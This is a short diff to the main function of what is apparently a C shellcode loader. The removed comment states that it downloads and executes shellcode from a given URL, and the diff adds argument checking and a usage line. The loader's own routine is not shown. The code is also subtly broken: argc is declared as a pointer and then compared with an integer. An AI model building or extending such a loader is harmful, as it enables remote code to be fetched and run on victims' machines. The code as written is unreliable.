@@ -81,13 +81,21 @@ void seed(int offset, int bytes, char *url)
 
 int main(int *argc, char *argv[])
 {
-    int offset = atoi(argv[1]);
-    int bytes = atoi(argv[2]);
+	
+    if (argc == 4)
+    {
+        int offset = atoi(argv[1]);
+        int bytes = atoi(argv[2]);
 
-    char *url = argv[3];
-
-    /* Download and execute Shellcode from the url
-    specified. */
-
-    seed(offset, bytes, url);
+        char *url = argv[3];
+	    
+        seed(offset, bytes, url);
+    }
+	
+    else
+    {
+	puts("seed [offset] [length] [url]");
+    }
+	
+    return 0;
 }
